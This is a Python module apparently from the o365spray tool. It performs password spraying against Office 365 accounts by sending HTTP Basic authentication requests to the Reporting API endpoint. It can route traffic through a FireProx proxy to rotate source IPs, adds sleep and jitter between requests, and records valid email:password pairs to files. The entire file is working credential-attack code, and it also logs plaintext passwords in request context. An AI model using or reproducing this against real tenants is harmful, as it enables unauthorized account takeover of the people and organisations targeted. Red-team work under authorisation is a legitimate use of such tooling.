#!/usr/bin/env python3

import logging
import time
from requests.auth import HTTPBasicAuth  # type: ignore

from o365spray.core.handlers.sprayer.modules.base import SprayerBase
from o365spray.core.utils import (
    Defaults,
    Helper,
    text_colors,
)


class SprayModule_reporting(SprayerBase):
    """Reporting Sprayer module class"""

    def __init__(self, *args, **kwargs):
        """Initialize the parent base class"""
        super(SprayModule_reporting, self).__init__(*args, **kwargs)

    def _spray(self, domain: str, user: str, password: str):
        """Spray users via the Office 365 Reporting API

        Arguments:
            domain: domain to spray
            user: username for authentication
            password: password for authentication

        Raises:
            Exception: generic handler so we can successfully fail without
              crashing the run
        """
        try:
            # Build email if not already built
            email = self.HELPER.check_email(user, domain)

            # Write the tested user
            tested = f"{email}:{password}"
            if self.writer:
                self.tested_writer.write(tested)

            time.sleep(0.250)

            # Grab default headers
            # Updated: copy headers to avoid cross-request mutation.
            headers = Defaults.HTTP_HEADERS.copy()

            # Handle FireProx API URL
            if self.proxy_url:
                proxy_url = self.proxy_url.rstrip("/")
                url = f"{proxy_url}/ecp/reportingwebservice/reporting.svc"

                # Update headers
                headers = Helper.fireprox_headers(headers)

            else:
                url = "https://reports.office365.com/ecp/reportingwebservice/reporting.svc"

            auth = HTTPBasicAuth(email, password)
            response = self._send_request(
                "get",
                url,
                auth=auth,
                headers=headers,
                proxies=self.proxies,
                timeout=self.timeout,
                sleep=self.sleep,
                jitter=self.jitter,
                retries=self.request_retries,
                retry_backoff=self.request_retry_backoff,
                # Updated: include request context for per-request logging.
                log_context={
                    "module": self.module_tag,
                    "action": "spray",
                    "target": email,
                    "username": user,
                    "password": password,
                },
            )
            status = response.status_code

            if status == 200:
                if self.writer:
                    self.valid_writer.write(tested)
                self.VALID_CREDENTIALS.append(tested)
                # Updated: richer CLI output for valid responses.
                self._log_spray_result(
                    "VALID",
                    email,
                    password,
                    status=status,
                    reason=response.reason,
                    detail="Reporting API auth accepted",
                )
                # Remove valid user from being sprayed again
                self.userlist.remove(user)

            else:
                # Updated: richer CLI output for invalid responses.
                self._log_spray_result(
                    "INVALID",
                    email,
                    password,
                    status=status,
                    reason=response.reason,
                    detail="Reporting API auth rejected",
                )

        except Exception as e:
            # Updated: surface request failures with context.
            logging.warning(
                f"[{text_colors.WARNING}REQUEST_FAILED{text_colors.ENDC}] "
                f"{user} | module={self.module_tag} | error={type(e).__name__}: {e}"
            )
            pass
